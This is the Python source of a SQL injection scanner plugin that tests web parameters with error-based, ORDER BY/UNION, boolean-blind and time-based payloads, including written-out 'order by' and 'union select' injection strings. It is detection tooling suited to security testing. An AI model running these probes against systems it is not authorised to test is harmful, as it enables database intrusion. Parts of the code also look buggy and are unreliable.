#!/usr/bin/env/python
#-*- coding:utf-8 -*-

__author__ = 'BlackYe.'

from lalascan.api.exception import LalascanNetworkException

from lalascan.libs.core.plugin import PluginBase
from lalascan.libs.core.pluginregister import reg_instance_plugin
from lalascan.libs.core.globaldata import logger, vulresult

from lalascan.libs.net.web_utils import parse_url, argument_query, get_request
from lalascan.libs.net.web_mutants import payload_muntants

from lalascan.data.resource.url import URL
from lalascan.data.vuln.vulnerability import WebVulnerability
from lalascan.utils.text_utils import to_utf8

from scanpolicy.policy import sql_inject_detect_err_msg_test_cases
from scanpolicy.policy import sql_inject_detect_boolean_test_cases
from scanpolicy.policy import sql_inject_detect_echo_test_cases
from scanpolicy.policy import sql_inject_detect_timing_test_cases

from thirdparty_libs.bind_sql_inject.fuzzy_string_cmp import relative_distance_boolean
from thirdparty_libs.bind_sql_inject.diff import diff

from random import randint, shuffle
import time, math

try:
    import re2 as re
except ImportError:
    import re
else:
    re.set_fallback_notification(re.FALLBACK_WARNING)

TEST_SQL_TYPE = ['ERR_MSG_DETECT', "ORDER_BY_DETECT", "BOOLEAN_DETECT", "TIMING_DETECT"]
#TEST_SQL_TYPE = ['TIMING_DETECT']

RSP_SHORT_DURATION = 2

# 25% more/less than the original wait time
DELTA_PERCENT = 1.25

#time base seconds
DELAY_SECONDS = [3, 4, 6, 2]

#order by check sign
ORDER_BY_SIGN = 'md5(95278)'

#order by md5 value
ORDER_BY_MD5_VAL = '59b874e05f47d8f295c63e0ed2578125'


class SqliPlugin(PluginBase):


    def __init__(self):
        pass


    def get_accepted_types(self):
        return [URL]


    #--------------------------------------------------------------------------
    def run(self, info):
        #if not info.has_url_params and not info.has_post_params:
        #    return

        m_url = info.url


        # If file is a javascript, css or image, do not run

        if info.parsed_url.extension[1:] in ('css', 'js', 'jpeg', 'jpg', 'png', 'gif', 'svg', 'txt') or ( not info.has_url_params and not info.has_post_params):
            logger.log_verbose("Skipping URL: %s" % m_url)
            return

        m_return = []

        b_continue = True
        m_source_url = []
        target = None

        if info.has_url_params:
            #param_dict = info.url_params

            for test_type in TEST_SQL_TYPE:
            #self.deal_param_payload(test_type, info.url, param_dict, method = info.method, referer = info.referer)
                if self.deal_param_payload(test_type, info, method = 'GET'):
                    return m_return

        if info.has_post_params:
            print info.post_params
            #print info.url, info.post_params
            #param_dict = info.post_params

            for test_type in TEST_SQL_TYPE:
                #self.deal_param_payload(test_type, info.url, param_dict, method = info.method, referer = info.referer)
                if self.deal_param_payload(test_type, info, method = 'POST'):
                    return m_return


        # Send the results
        return m_return


    def deal_param_payload(self, sql_detect_type, url, method = 'GET',  **kwargs):
        '''
        insert payload into param
        :return:
        '''

        if not isinstance(sql_detect_type, str):
            raise TypeError("Expected sql_detect_type string, type:%s" % type(sql_detect_type))

        if not isinstance(url, URL):
            raise TypeError("Expected url type, type:%s" % type(url))

        #if not isinstance(param_dict, dict):
        #    raise TypeError("Expected param_dict string, type:%s" % type(param_dict))

        if method == 'GET':
            param_dict = url.url_params
        elif method == 'POST':
            param_dict = url.post_params


        is_timing_stable = True
        short_duration = 1

        def __check_if_rsp_stable_on_orig_input():
            p = get_request(url = url, allow_redirects=False)
            if p.status != '200':
                is_timing_stable = False

            orig_first_time       = p.elapsed
            orig_first_resp_body  = p.data

            time.sleep(2)

            p = get_request(url = url, allow_redirects=False)
            if p.status != '200':
                is_timing_stable = False

            orig_second_time        = p.elapsed
            orig_second_resp_body   = p.data

            min_resp_time = min(orig_first_time, orig_second_time)
            max_resp_time = max(orig_first_time, orig_second_time)

            short_duration = max(RSP_SHORT_DURATION, max_resp_time) + 1
            long_duration  = short_duration * 2

            if (max_resp_time - min_resp_time) > short_duration:
                is_timing_stable = False
            else:
                is_timing_stable = True

            if orig_first_resp_body != orig_second_resp_body:
                is_timing_stable = False


        def __check_if_rsp_stable_on_invalid_input():
            #TODO judge url is stable
            is_timing_stable = True

        #__check_if_rsp_stable_on_orig_input()

        if sql_detect_type == "ERR_MSG_DETECT":
            for k,v in param_dict.iteritems():

                key = to_utf8(k)
                value = to_utf8(v)

                for test_case_dict in sql_inject_detect_err_msg_test_cases:

                    p, payload_resource = payload_muntants(url, payload = {'k': k , 'pos': 1, 'payload':test_case_dict['input'], 'type': 0}, bmethod = method)
                    if self._err_msg_sql_detect(p, test_case_dict['target']):
                        #print '[+] found sql inject in url:{0}, payload:{1}'.format(req_uri, payload_param_dict)
                        vulresult.put_nowait(WebVulnerability(target = payload_resource, vulparam_point = key, method = method, payload = test_case_dict['input'], injection_type = "SQLI"))

                        logger.log_success('[!+>>>] found %s err_msg sql inject vulnerable!' % payload_resource.url)
                        return True

        elif sql_detect_type == 'ORDER_BY_DETECT':
            for k, v in param_dict.iteritems():

                key = to_utf8(k)
                value = to_utf8(v)

                if self._orderby_sql_detect(k = key, v = value , url = url, method = method):
                    return True


        elif sql_detect_type == "ECHO_DETECT":
            self._echo_sql_detect()

        elif sql_detect_type == "BOOLEAN_DETECT":
            print '----------- BOOLEAN_DETECT -----------------------'
            for k, v in param_dict.iteritems():

                key = to_utf8(k)
                value = to_utf8(v)

                if self._boolean_sql_detect(k = key, v = value , url = url, method = method):
                   return True

        elif sql_detect_type == "TIMING_DETECT":
            print '-----------TIMING_DETECT -----------------------'

            if is_timing_stable == True:
                for k, v in param_dict.iteritems():

                    key = to_utf8(k)
                    value = to_utf8(v)
                    if self._timing_sql_detect(k = k, v = value, url = url, method = method, short_duration = short_duration):
                        #print '[+] found time_based sql inject!'
                        return True


    def _err_msg_sql_detect(self, response_mutants, sql_err_re):
        '''
        sql报错注入
        :return:
        '''

        if response_mutants is not None:
            __ = re.search(sql_err_re, response_mutants.data)
            if __ is not None:
                return True

        return False

    def _orderby_sql_detect(self, **kwargs):
        '''
        order by 注入
        :param kwargs:
        :return:
        '''
        k = kwargs.get("k", None)
        if k is None or not isinstance(k, str):
            raise ValueError("Except param has not key!")

        v = kwargs.get("v", None)

        url = kwargs.get("url", None)
        if url is None or not isinstance(url, URL):
            raise ValueError("Except param has not req_uri")

        method = kwargs.get('method', None)

        max_bound = 100
        min_bound = -1

        lower_index, high_index = 0, max_bound

        table_column = 0

        max_order_column_payload = ' order by {0}--'.format( max_bound )
        min_order_column_payload = ' order by {0}--'.format( min_bound )

        p = get_request(url = url, allow_redirects = False)

        if p.status != '200' and p is None:
            return False

        orig_resp_body  = p.data

        max_order_column_payload_rsp = None
        min_order_column_payload_rsp = None
        try:
            max_order_column_payload_rsp, _ = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':max_order_column_payload, 'type': 0}, bmethod = method).data
            min_order_column_payload_rsp, _ = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':min_order_column_payload, 'type': 0}, bmethod = method).data
        except AttributeError:
            return False

        if max_order_column_payload_rsp != None and min_order_column_payload_rsp != None and (orig_resp_body != max_order_column_payload_rsp) and (orig_resp_body == min_order_column_payload_rsp):
            #maybe exist sql_inject

            while lower_index <= high_index:
                #二分法
                col = int(math.ceil( (lower_index + high_index) / 2))
                column_payload = ' order by {0}--'.format(col)
                column_payload_rsp = None
                try:
                    column_payload_rsp, _ = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':column_payload, 'type': 0}, bmethod = method, use_cache = False).data
                except AttributeError:
                    pass

                if column_payload_rsp != None and column_payload_rsp != orig_resp_body:
                    if (lower_index + 1)  == high_index:
                        break
                    high_index = col
                else:
                    if (lower_index + 1) == high_index:
                        table_column = lower_index
                        print '*' * 50
                        break
                    elif lower_index == high_index:
                        table_column = high_index
                        break
                    lower_index = col

        if table_column != 0:

            logger.log_verbose("[+!>>>] %s maybe has order by inject!" % url.url)
            for inject_index in range(table_column):
                union_list = [x+1 for x in range(table_column)]
                union_list[inject_index] = ORDER_BY_SIGN
                union_payload = ' and 1=2 union select {0}'.format(','.join(map(str,union_list)))
                union_payload_rsp = None
                try:
                    union_payload_rsp, payload_resource = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':union_payload, 'type': 0}, bmethod = method, use_cache = False).data
                except AttributeError:
                    pass

                if union_payload_rsp != None and ORDER_BY_MD5_VAL in union_payload_rsp:
                    vulresult.put_nowait(WebVulnerability(target = payload_resource, vulparam_point = k, method = method, payload = union_payload, injection_type = "SQLI"))
                    logger.log_success('[!+>>>] found %s order_by sql inject vulnerable!' % payload_resource.url)
                    return True

        return False



    def _echo_sql_detect(self, **kwargs):
        '''
        echo 测试
        :return:
        '''
        pass


    def _boolean_sql_detect(self, **kwargs):
        '''
        bool 型注入探测（盲注）
        :return:
        '''
        k = kwargs.get("k", None)
        if k is None or not isinstance(k, str):
            raise ValueError("Except param has not key!")

        v = kwargs.get("v", None)

        url = kwargs.get("url", None)
        if url is None or not isinstance(url, URL):
            raise ValueError("Except param has not req_uri")

        method = kwargs.get('method', None)
        #TODO method str


        for boolean_test_case_dict in sql_inject_detect_boolean_test_cases:
            rand_num = randint(10, 9999)
            true_case = boolean_test_case_dict['true_case'].replace("val", str(v)).replace("num", str(rand_num))
            false_case = boolean_test_case_dict['false_case'].replace("val", str(v)).replace("num", str(rand_num))
            confirm_true_case = boolean_test_case_dict['confirm_true_case'].replace("val", str(v)).replace("num", str(rand_num))
            confirm_false_case = boolean_test_case_dict['confirm_false_case'].replace("val", str(v)).replace("num", str(rand_num))

            body_true_response = None
            body_false_response = None
            try:
                body_true_response,  payload_resource  = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':true_case, 'type': 1}, bmethod = method).data
                body_false_response, _  = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':false_case, 'type': 1}, bmethod = method).data
            except AttributeError:
                continue

            if body_true_response == body_false_response:
                continue

            compare_diff = False
            print 'Comparing body_true_response and body_false_response.'
            if self.__equal_with_limit(body_true_response, body_false_response,
                                 compare_diff):

                compare_diff = True

            try:
                body_confirm_true_response ,  _ = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':confirm_true_case, 'type': 1}, bmethod = method).data
                body_confirm_false_response,  _ = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':confirm_false_case, 'type': 1}, bmethod = method).data
            except AttributeError:
                continue

            if self.__equal_with_limit(body_true_response,
                                 body_confirm_false_response,
                                 compare_diff):
                continue

            if not self.__equal_with_limit(body_confirm_true_response,
                                     body_true_response,
                                     compare_diff):
                continue

            if self.__equal_with_limit(body_confirm_false_response,
                                 body_false_response,
                                 compare_diff):

                vulresult.put_nowait(WebVulnerability(target = payload_resource, vulparam_point = k, method = method, payload = true_case, injection_type = "SQLI"))
                logger.log_success('[!+>>>] found %s boolean sql inject vulnerable!' % payload_resource.url)
                return True

        return False



    def _timing_sql_detect(self, **kwargs):
        '''
        延时注入(盲注)
        :return:
        '''

        k = kwargs.get("k", None)
        if k is None or not isinstance(k, str):
            raise ValueError("Except param has not key!")

        v = kwargs.get("v", None)

        url = kwargs.get("url", None)
        if url is None or not isinstance(url, URL):
            raise ValueError("Except param has not req_uri")

        method = kwargs.get('method', None)
        short_duration = kwargs.get('short_duration', None)
        #print 'short_duration:{0}'.format(short_duration)

        rand_str = str(randint(90000, 99999))

        for timing_test_case_dict in sql_inject_detect_timing_test_cases:
        #if timing_test_case_dict is not None:

            payload_resource = ''
            time_payload = ''
            def delay_for(original_wait_time, delay):
                time_payload = timing_test_case_dict['input'].replace("rndstr", rand_str).replace('duration', str(delay)).replace('val', v)

                delta = original_wait_time * DELTA_PERCENT
                upper_bound = (delay * 2) + original_wait_time + delta + 1
                lower_bound = original_wait_time + delay - delta

                try:
                    current_response_wait_time, payload_resource = payload_muntants(url_info = url, payload = {'k': k , 'pos': 1, 'payload':time_payload, 'type': 1}, bmethod = method, use_cache = False, timeout = upper_bound).elapsed
                    if upper_bound > current_response_wait_time > lower_bound:
                        return True
                except Exception:
                    return False

            def get_original_time():
                try:
                    p = get_request(url = url, allow_redirects= False)
                    return p.elapsed
                except LalascanNetworkException:
                    return None

            bvul = True

            shuffle(DELAY_SECONDS)
            for delay in DELAY_SECONDS:
                if not delay_for(get_original_time(), delay):
                    bvul = False

            if bvul:
                vulresult.put_nowait(WebVulnerability(target = payload_resource, vulparam_point = k, method = method, payload = time_payload, injection_type = "SQLI"))
                logger.log_success('[!+>>>] found %s boolean sql inject vulnerable!' % payload_resource.url)

                return True



     #--------------------------------------------------------------------------
    def check_download(self, url, name, content_length, content_type):
        print '******************'
        print url
        print name
        print content_length
        print content_type


    def __equal_with_limit(self, body1, body2, compare_diff=False):
        """
        Determines if two pages are equal using a ratio.
        """
        if compare_diff:
            body1, body2 = diff(body1, body2)

        cmp_res = relative_distance_boolean(body1, body2, 0.8)

        return cmp_res


reg_instance_plugin(SqliPlugin)